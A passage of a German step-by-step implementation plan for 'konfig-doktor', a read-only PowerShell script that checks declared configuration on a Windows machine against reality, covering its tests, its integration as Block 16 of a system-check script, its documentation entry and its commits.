        $w = Get-Command wsl.exe -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($w) {
            $r = Invoke-Extern -Datei $w.Source -Argumente @('--status') -TimeoutSek 10
            if ($r.TimedOut) {
                Add-Befund -Id 'LAUFZEIT-WSL' -Modul 'laufzeit' -Schwere 'WARNUNG' -Titel 'WSL antwortet nicht binnen 10 s' `
                    -Beleg 'wsl --status: Zeitlimit' -Status 'gesichert' -Vorschlag 'Entscheidung ueber Neustart liegt bei Max'
            }
            elseif ($r.ExitCode -ne 0) {
                Add-Befund -Id 'LAUFZEIT-WSL' -Modul 'laufzeit' -Schwere 'HINWEIS' -Titel 'wsl --status meldet Fehler' `
                    -Beleg "wsl --status Exit $($r.ExitCode)" -Status 'gesichert' -Vorschlag 'Nur relevant, wenn WSL gebraucht wird'
            }
        }
    }
}

```

- [ ] **Step 5: Test laufen lassen, Erfolg bestätigen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alle `ok`, `konfig-doktor bestanden`. (Der Test löscht seine Fixture-Junction vor dem Aufräumen; die Ordner `O:\Modelle`/`O:\Werkstatt` bleiben unberührt, weil die Fixture nur auf eigene Temp-Ziele zeigt.)

- [ ] **Step 6: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1; git commit -m "konfig-doktor: Modul laufzeit (Junctions, Platz/Commit, Docker/WSL)" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/konfig-doktor.ps1 Agenten/Routinen/tests/konfig-doktor.test.ps1`

---

### Task 8: Gegenprobe an der echten Wurzel, Einbindung, Dokumentation, Erstlauf

**Files:**
- Modify: `Agenten/Routinen/tests/konfig-doktor.test.ps1` (Abschnitt oberhalb `# === ENDE`)
- Modify: `Agenten/Routinen/systempruefung.ps1` (neuer Block 16 nach Block 15)
- Modify: `MaxHirn/Wissen/Routinen.md` (Eintrag)

**Interfaces:**
- Consumes: `konfig-doktor.ps1 -Kurz` (Ausgabe: eine Zeile `konfig-doktor: KRITISCH n | WARNUNG n | HINWEIS n | UNKLAR n`, Exit 0/1/2); in `systempruefung.ps1` die Hilfsfunktion `Notiz`
- Produces: Block 16 in `systempruefung.ps1`; Dokumentationszeile

- [ ] **Step 1: Test der echten Wurzel (nur lesend) schreiben**

Oberhalb von `# === ENDE` einfügen:

```powershell
Write-Host '--- echte Wurzel (Gegenprobe) ---'
$echteWurzel = Split-Path (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent) -Parent
$vorher = (& git -C $echteWurzel status --porcelain 2>$null) -join "`n"
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$k = Lauf-Kind @('-Kurz')
$sw.Stop()
$nachher = (& git -C $echteWurzel status --porcelain 2>$null) -join "`n"
Pruefe 'echter Lauf endet mit Exit 0 oder 1 (nicht 2)' (($k.Exit -eq 0) -or ($k.Exit -eq 1)) "Exit=$($k.Exit) $($k.Out)"
Pruefe 'echter Lauf liefert die Zaehlzeile' ($k.Out -match 'konfig-doktor: KRITISCH \d+ \| WARNUNG \d+ \| HINWEIS \d+ \| UNKLAR \d+')
Pruefe 'echter Lauf dauert unter 60 s' ($sw.Elapsed.TotalSeconds -lt 60) ("{0:N1} s" -f $sw.Elapsed.TotalSeconds)
Pruefe 'git status vorher = nachher (nichts veraendert)' ($vorher -ceq $nachher) '(andere Sitzungen koennen waehrenddessen schreiben: Test wiederholen)'

```

- [ ] **Step 2: Test laufen lassen**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/tests/konfig-doktor.test.ps1`
Expected: alles `ok`. Schlägt nur `git status vorher = nachher` fehl, weil eine andere Sitzung parallel schreibt: einmal wiederholen; bleibt es, `git status --porcelain` vor/nach von Hand diffen und die Ursache benennen (der Doktor darf nichts schreiben).

- [ ] **Step 3: Block 15 der Systemprüfung als Muster lesen**

`Agenten/Routinen/systempruefung.ps1` Zeilen 838 bis 862 lesen (Block 15 "Fremd-Grenze" und Anfang von "Bericht schreiben"). Zu beachten: Wurzel-Variable `$wurzel`, Hilfsfunktion `Notiz`, try/catch-Stil, Zeilenende der Datei (CRLF oder LF: `(Get-Content -Raw ...) -match "`r`n"`).

- [ ] **Step 4: Block 16 gezielt einfügen**

Mit Edit (ein Anker, eindeutig) direkt nach Block 15 und vor "Bericht schreiben" einfügen; Stil von Block 15 übernehmen (Einrückung, Kommentarzeile). Inhalt:

```powershell
# 16. Konfig-Doktor (rein lesend, nur Zaehlung; Bericht per konfig-doktor.ps1 ohne -Kurz)
$doktor = Join-Path $PSScriptRoot 'konfig-doktor.ps1'
if (Test-Path -LiteralPath $doktor) {
    try {
        $dOut = (& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $doktor -Kurz 2>&1 | Out-String).Trim()
        $dCode = $LASTEXITCODE
        if ($dCode -eq 2) { Notiz "  ! Konfig-Doktor selbst defekt: $dOut" }
        elseif ($dCode -eq 1) { Notiz "  ! $dOut (mind. ein KRITISCH - Bericht: konfig-doktor.ps1 ohne -Kurz)" }
        else { Info "  $dOut" }
    }
    catch { Notiz "  ! Konfig-Doktor abgebrochen: $_" }
}
```

(`Info` und `Notiz` nur verwenden, wenn Block 15 beide so nutzt; sonst den von Block 15 verwendeten Aufruf für "ok"-Ausgabe übernehmen.)

- [ ] **Step 5: Zeilenenden und Syntax prüfen, nicht die ganze Systemprüfung ausführen**

Run (PowerShell): `cd C:\Users\faupe\Documents\BrainFiles; $t = [IO.File]::ReadAllText('Agenten/Routinen/systempruefung.ps1'); 'CRLF: ' + ([regex]::Matches($t, "`r`n").Count) + ' / lone LF: ' + ([regex]::Matches($t, "(?<!`r)`n").Count)`
Expected: entweder nur CRLF oder nur LF (je nach Original). Gemischt -> eingefügte Zeilen auf das Zeilenende der Datei bringen (gezielt, nicht die Datei neu schreiben).

Run (PowerShell): `cd C:\Users\faupe\Documents\BrainFiles; $e = $null; [void][System.Management.Automation.Language.Parser]::ParseFile((Resolve-Path 'Agenten/Routinen/systempruefung.ps1'), [ref]$null, [ref]$e); 'Syntaxfehler: ' + @($e).Count`
Expected: `Syntaxfehler: 0`.

Dann den Aufruf des Blocks einzeln belegen: `cd C:\Users\faupe\Documents\BrainFiles; powershell.exe -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/konfig-doktor.ps1 -Kurz`
Expected: eine Zeile `konfig-doktor: KRITISCH n | WARNUNG n | HINWEIS n | UNKLAR n`. `systempruefung.ps1` selbst wird nicht ausgeführt (sie kann reparieren); Max startet sie bei Gelegenheit.

- [ ] **Step 6: Dokumentationseintrag in `Routinen.md`**

`MaxHirn/Wissen/Routinen.md` im Bereich um Zeile 43 (Systemprüfung) und Zeile 73 (Task-Tabelle) lesen und je eine Zeile im Stil der Nachbarn per Edit ergänzen: Name `konfig-doktor.ps1`, Zweck "prüft deklarierte Konfiguration gegen die Wirklichkeit, rein lesend", Aufruf (`konfig-doktor.ps1`, `-Kurz`, `-Modul <name>`), Bericht `Werkstatt/konfig-doktor-<datum>.md`, Einbindung als Block 16 der Systemprüfung, Verweis auf Spec und Plan in `Werkstatt/`. `MaxHirn/Wissen/` gehört dem Bereich `wissen` (andere Sitzung): vorher melden:

Run: `cd C:\Users\faupe\Documents\BrainFiles; python Agenten/Werkzeuge/bereiche.py --aufrufer konfig-doktor --pfad MaxHirn/Wissen/Routinen.md`
Expected: Exit 0 oder Exit 1 (BEFUND). Beides im Ledger vermerken, nicht blockieren (Hausregel). Zeilenenden nach dem Edit wie in Step 5 prüfen.

- [ ] **Step 7: Erstlauf mit Bericht (nur lesend), Ergebnis sichten**

Run: `cd C:\Users\faupe\Documents\BrainFiles; powershell.exe -NoProfile -ExecutionPolicy Bypass -File Agenten/Routinen/konfig-doktor.ps1`
Expected: vier Zeilen (je Stufe) und `Bericht: ...\Werkstatt\konfig-doktor-<datum>.md`. Bericht lesen. Prüfen, ob die bei Spec-Beginn bekannten Befunde auftauchen (Zweige `claude/*`/`maks.420`, `auth.json.corrupt`, Doppelskripte `sichern-aussenhaus.ps1`/`sichern-ausser-haus.ps1`, `Agenten/Werkstatt/`) und ob die zuvor "fehlenden" Manifest-Pfade (`dist/index.js`, `src/run_stdio.py`) mit korrektem `cwd` tatsächlich fehlen oder ein Fehlalarm waren. Beides in der Übergabe gesichert/Vermutung getrennt berichten. **Keine Reparatur, kein Commit des Berichts.**

- [ ] **Step 8: Commit**

Run: `cd C:\Users\faupe\Documents\BrainFiles; git add Agenten/Routinen/tests/konfig-doktor.test.ps1 Agenten/Routinen/systempruefung.ps1 MaxHirn/Wissen/Routinen.md; git commit -m "konfig-doktor: Gegenprobe echte Wurzel, Block 16 in systempruefung, Eintrag in Routinen.md" -m "Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>" -- Agenten/Routinen/tests/konfig-doktor.test.ps1 Agenten/Routinen/systempruefung.ps1 MaxHirn/Wissen/Routinen.md`

Vorher `git diff -- Agenten/Routinen/systempruefung.ps1 MaxHirn/Wissen/Routinen.md`: nur die eigenen Zeilen dürfen im Diff stehen (andere Sitzungen können dieselben Dateien angefasst haben; sind fremde Änderungen enthalten, nur eigene Hunks committen oder das im Ledger melden und stoppen).

---

## Selbstreview (gegen die Spec)

- Ziel/Erfolg (lesend, <60 s, Bericht, aus Systemprüfung aufrufbar): Task 1 (Bericht), Task 8 (Zeit, Block 16).
- Sechs Module mit `-Modul`: Tasks 2 bis 7; Reihenfolge der Tabelle = Spec.
- Vier Stufen + gesichert/Vermutung, Befundformat: Task 1 (`Add-Befund` mit ValidateSet).
- Modul-Isolation und `PRUEFUNG-FEHLGESCHLAGEN`: Task 1 (Abweichung: Stufe UNKLAR, oben begründet).
- Zeitlimit 20 s -> UNKLAR: Task 1 (`ZEITLIMIT-*`, weich je Modul) und hartes Limit je externem Aufruf in `Invoke-Extern`.
- Keine Rekursion in `installs`/`profiles`: Tasks 3, 6 (nur Ebene 1).
- Linux/Cloud -> UNKLAR: Tasks 3 und 7 (`$env:OS`).
- Exit 0/1/2: Task 1 (Test mit Kindprozess).
- Bericht-/Konsolenformat, nie Key-Werte: Task 1 (`Maske`, Test), Task 3 (Auth-Test).
- Tests im Hausstil, Ende "konfig-doktor bestanden", `git status` vorher/nachher: Tasks 1, 8.
- Einbindung (`-Kurz`, Routinen.md, Commit auf master): Task 8; Besitz-Meldung als BEFUND ebenda.
- Offene Punkte: Config-Schrumpfung als UNKLAR (Task 3); Session-MCP-Ausfälle nicht lesbar (Abweichung oben).
- Placeholder-Scan: keine TBD; die "Falls Step 1 ..."-Hinweise sind benannte Rückfallzweige mit konkretem Ersatzbefund, keine offenen Stellen.
- Typkonsistenz: `Add-Befund`-Parameter, `Invoke-Extern`-Rückgabe `{ExitCode, Out, Err, TimedOut}`, Variablen `$WurzelExplizit`/`$OhneExtern`/`$Kurz`/`$ModulLimitSek` in allen Tasks gleich benannt; Test-Helfer `Lauf`/`Lauf-Kind`/`Hat`/`Schwere-Von` in Task 1 definiert und später nur benutzt.
